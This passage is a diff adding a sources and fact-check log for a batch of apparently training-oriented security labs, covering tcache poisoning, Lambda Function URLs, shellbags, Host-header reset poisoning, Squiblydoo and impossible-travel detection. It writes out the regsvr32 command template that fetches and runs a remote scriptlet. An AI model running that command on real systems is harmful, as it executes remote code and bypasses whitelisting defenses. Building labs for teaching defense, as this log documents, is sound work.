@@ -483,3 +483,81 @@ genuinely work against a real target, not just read plausibly.
 - No other techniques in this batch required skipping or faking; all six were mechanically modeled with
   full fidelity to how `TerminalEngine` actually works (confirmed by reading the relevant `engine.ts`
   functions before writing each lab, not just assuming prior-batch conventions still applied).
+
+## Sources checked, batch 11 (tcache poisoning, Lambda Function URL, shellbags, Host header poisoning, Squiblydoo, impossible travel)
+
+- **glibc tcache poisoning via a UAF-enabled double-free, defeating the pre-2.32 lack of Safe-Linking** —
+  [Check Point Research: Safe-Linking — Eliminating a 20 year-old malloc() exploit primitive](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/),
+  [Lanph3re: Heap exploit mitigation in Glibc 2.32 — Safe Linking](https://lanph3re.blogspot.com/2020/08/blog-post.html),
+  [HackTricks: Tcache Bin Attack](https://hacktricks.wiki/en/binary-exploitation/libc-heap/tcache-bin-attack.html).
+  Confirmed two real, distinct, version-specific facts rather than one general "heap exploitation" claim:
+  (1) glibc 2.29 added a per-chunk "key" field written on `free()` specifically to detect a direct
+  double-free of the same chunk, and (2) glibc 2.32 added Safe-Linking, which XOR-obfuscates the tcache/
+  fastbin freelist's forward pointer with the chunk's own (randomized, ASLR-dependent) address, specifically
+  to stop the classic "forge a raw pointer, redirect malloc() anywhere" primitive this lab depends on. This
+  lab's binary is deliberately glibc 2.29 (predates Safe-Linking, but does have the key check), and pairs it
+  with a separate UAF-write bug that clears the key field before the second free — a combination confirmed
+  as the real, standard way modern tcache-poisoning exploits defeat the 2.29-era check when a bare
+  double-free isn't directly possible. Deliberately built as Full RELRO (unlike batch 10's Partial-RELRO
+  GOT-overwrite lab) so the two Binary Analysis labs are mechanically non-overlapping: one closes off GOT
+  overwrite entirely and reaches a different writable target via heap corruption instead.
+- **AWS Lambda Function URL public via `authType: NONE`** — [AWS docs: Control access to Lambda function URLs](https://docs.aws.amazon.com/lambda/latest/dg/urls-auth.html),
+  [Datadog Security Labs: Lambda function is publicly accessible through function URL](https://securitylabs.datadoghq.com/cloud-security-atlas/vulnerabilities/lambda-function-public-url/),
+  [Wiz: Securing AWS Lambda function URLs](https://www.wiz.io/blog/securing-aws-lambda-function-urls).
+  Confirmed the exact real mechanism and AWS's own wording: with `authType` set to `NONE`, "Lambda doesn't
+  perform any authentication before invoking your function," and the function's resource-based policy is
+  what actually grants the public access — this is a real, currently-documented AWS feature (Function URLs
+  shipped 2022) and a real, currently-flagged misconfiguration class distinct from every other Cloud lab on
+  this platform (IMDSv2, Docker socket, Lambda env-var secrets, Azure SAS, GCP `allUsers`, Kubernetes
+  automount) — none of which involve this specific `authType` setting.
+- **Windows Shellbags (`BagMRU`) surviving a deleted folder and a removed USB volume** — [Magnet Forensics: Forensic Analysis of Windows Shellbags](https://www.magnetforensics.com/blog/forensic-analysis-of-windows-shellbags/),
+  [Pen Test Partners: DFIR tools and techniques for tracing user footprints through Shellbags](https://www.pentestpartners.com/security-blog/dfir-tools-and-techniques-for-tracing-user-footprints-through-shellbags/).
+  Confirmed the real registry location (`HKCU\Software\Microsoft\Windows\Shell\BagMRU`), the real mechanism
+  (Windows Explorer logs every folder browsed, including on removable media, independent of the
+  `$STANDARD_INFORMATION`/`$FILE_NAME`/MFT-based artifacts this session's other Forensics labs rely on), and
+  the specific, real forensic value cited across multiple independent sources: shellbags persist even after
+  the folder — or the entire volume it lived on — is deleted or disconnected, since the registry entry is
+  written at browse-time and never references back to check the target still exists.
+- **HTTP Host header injection enabling password reset poisoning** — [PortSwigger Web Security Academy: Password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning),
+  [OWASP: Testing for Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection).
+  Confirmed this is PortSwigger's own named vulnerability class with dedicated Academy labs, and the real
+  root cause: a password-reset handler that builds the emailed reset link by copying the request's
+  attacker-controlled `Host` header instead of using a server-side configured domain. In production the
+  forged link's token would only ever be observable via the real outbound email (invisible to network
+  logs); this lab pairs the real Host-header bug with a second, separately real anti-pattern (an
+  unauthenticated staging mail-capture/QA tool mirroring outgoing email) so the full chain resolves to a
+  single request within this engine's stateless request/response model — flagged below under NEEDS REVIEW
+  for transparency about that combination, consistent with how this file has handled similar simplifications
+  in prior batches.
+- **regsvr32.exe "Squiblydoo" application-whitelisting bypass (MITRE ATT&CK T1218.010)** — [MITRE ATT&CK: T1218.010 — System Binary Proxy Execution: Regsvr32](https://attack.mitre.org/techniques/T1218/010/),
+  [LOLBAS project: Regsvr32](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/),
+  [ired.team: regsvr32 aka Squiblydoo](https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo).
+  Confirmed the real, MITRE-catalogued technique and its actual mechanism: `regsvr32.exe /s /n /u
+  /i:<url> scrobj.dll` fetches and executes a remote COM scriptlet without ever registering a COM object or
+  writing to the registry, and because `regsvr32.exe` itself is a default-trusted, Microsoft-signed binary,
+  a whitelisting policy built around "only signed binaries execute" approves the process without inspecting
+  the remote script content — the real reason this bypass earned its "Squiblydoo" nickname in nation-state
+  phishing campaigns cited by multiple independent sources.
+- **Impossible travel / geo-velocity anomaly detection** — [Datadog: Detect suspicious login activity with impossible travel detection rules](https://www.datadoghq.com/blog/impossible-travel-detection-rules/),
+  [ManageEngine Log360: How to Detect Impossible Travel Activity](https://www.manageengine.com/log-management/siem-use-cases/threats/impossible-travel.html).
+  Confirmed this is a real, standard, currently-shipped SIEM/UEBA analytic (multiple named commercial
+  products implement it as a built-in rule type), and independently recomputed this lab's own numbers with
+  Node (a haversine great-circle-distance calculation between Accra and Kyiv, ~5,745.9 km, and the implied
+  speed over a 14-minute window, ~24,625 km/h, ~27.4x a commercial jet's cruise speed) rather than trusting
+  hand-typed figures, consistent with this file's standing rule about re-deriving any computed value before
+  committing it.
+
+## NEEDS REVIEW (labs/topics), batch 11
+
+- The Host header password-reset-poisoning lab combines two separately real bugs into one request/response
+  to fit this engine's stateless model: the Host-header-driven link construction (fully real, PortSwigger-
+  documented) and an unauthenticated staging mail-capture endpoint surfacing the generated email content
+  directly (a separately real, common anti-pattern, but not literally the same request in a true production
+  system — there, the forged link would only ever leave via the actual outbound email, requiring a genuine
+  mailbox compromise or SMTP-relay-log read to observe). Noted here rather than presented as a single
+  atomic real-world request, the same transparency standard applied to the DOM-prototype-pollution
+  code-review lab in batch 10 and the GPP cpassword `smbclient` fix in batch 9.
+- No other techniques in this batch required skipping or faking; all six were mechanically modeled with
+  full fidelity to how `TerminalEngine` actually works, and all six were verified end-to-end with a scripted
+  `tsx` run against the real `TerminalEngine` class — full solve path captures exactly one flag per lab, and
+  a plausible-but-wrong request per lab captures none.
